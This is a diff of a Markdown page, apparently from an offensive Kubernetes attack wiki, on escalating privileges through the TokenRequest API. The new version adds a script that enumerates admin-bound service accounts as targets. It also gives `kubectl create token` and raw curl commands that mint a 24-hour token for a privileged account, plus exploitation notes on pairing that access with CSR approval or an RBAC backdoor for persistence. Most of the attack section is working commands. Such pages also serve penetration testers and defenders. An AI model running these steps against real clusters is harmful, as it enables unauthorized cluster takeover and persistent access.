@@ -1,32 +1,53 @@
 ---
-title: "TokenRequest API: minting tokens for service accounts you can act on"
-description: "Escalating in Kubernetes with the TokenRequest API or the create serviceaccounts/token right, which mints a valid token for a service account, so an identity able to request tokens for a privileged account can act as it."
+title: "TokenRequest API: minting tokens for other service accounts"
+description: "The TokenRequest API issues a bound token for a service account through the serviceaccounts/token subresource. An identity that can create tokens for a service account more privileged than itself mints that account's token and acts as it, escalating by borrowing the identity of any service account it is allowed to request tokens for."
 keywords:
-  - TokenRequest API
-  - serviceaccounts/token
-  - token minting
+  - tokenrequest
+  - serviceaccounts token
   - service account
-  - kubernetes escalation
+  - bound token
+  - privilege escalation
 ---
 
 # TokenRequest API
 
-The TokenRequest API issues short-lived tokens for service accounts. The permission `create` on the `serviceaccounts/token` subresource lets an identity mint a token for that account. If you can request tokens for a more privileged service account, you can become it.
+The TokenRequest API mints a short-lived, audience-bound token for a service account, exposed as the `serviceaccounts/token` subresource and used by `kubectl create token`. The escalation is straightforward: if the current identity can create a token for a service account that has more permissions than it does, it mints that account's token and then acts with its rights. This borrows a more powerful identity without touching any binding.
+
+Check what the identity can request:
 
 ```bash
 kubectl auth can-i create serviceaccounts/token
-# Mint a token for a target service account
-kubectl create token <privileged-sa> -n <ns>
-kubectl --token=<minted> auth can-i --list
+kubectl auth can-i create serviceaccounts/token --subresource=token -n kube-system
+# find privileged service accounts to target (bound to admin-ish roles)
+kubectl get clusterrolebindings -o json | python3 -c '
+import sys,json
+for b in json.load(sys.stdin)["items"]:
+    r=b.get("roleRef",{}).get("name","")
+    for s in b.get("subjects") or []:
+        if s.get("kind")=="ServiceAccount" and ("admin" in r or r=="cluster-admin"):
+            print(r, s["namespace"]+"/"+s["name"])'
+```
+
+## Mint and use the token
+
+```bash
+# mint a token for a powerful service account
+kubectl create token <privileged-sa> -n <ns> --duration=24h
+# raw API equivalent:
+curl -sk -XPOST -H "Authorization: Bearer $T" -H 'Content-Type: application/json' \
+  $APISERVER/api/v1/namespaces/<ns>/serviceaccounts/<privileged-sa>/token \
+  -d '{"spec":{"audiences":["https://kubernetes.default.svc"]}}'
+# use the returned token as that service account
+kubectl --token="<minted>" auth can-i '*' '*'
 ```
 
 ## Exploitation notes
 
-- This is the modern replacement for reading long-lived token secrets; the right to mint is the escalation, scoped to the service accounts you may act on.
-- Combine with enumeration of which service accounts are privileged, then mint for the strongest one you are allowed.
-- Minted tokens are time-bound, so use them promptly or re-mint; for durable access prefer [CSR approval](csr-approval.md).
+- The gate is `create` on `serviceaccounts/token` for the target account; combined with a service account bound to a powerful role (found via the binding scan above), it is a direct escalation.
+- Minted tokens are bound and time-limited, so this is access rather than durable persistence; pair with [CSR approval](csr-approval.md) or an [RBAC backdoor](../persistence/rbac-backdoor.md) for durability.
+- This is also the mechanism behind legitimate token discovery; see [Service account and token discovery](../cluster-enumeration/service-account-and-token-discovery.md).
 
 ## References
 
-- [Kubernetes: service account token volume projection](https://kubernetes.io/docs/tasks/configure-pod-container/configure-service-account/#serviceaccount-token-volume-projection)
 - [Kubernetes: TokenRequest API](https://kubernetes.io/docs/reference/kubernetes-api/authentication-resources/token-request-v1/)
+- [Kubernetes: kubectl create token](https://kubernetes.io/docs/reference/kubectl/generated/kubectl_create/kubectl_create_token/)
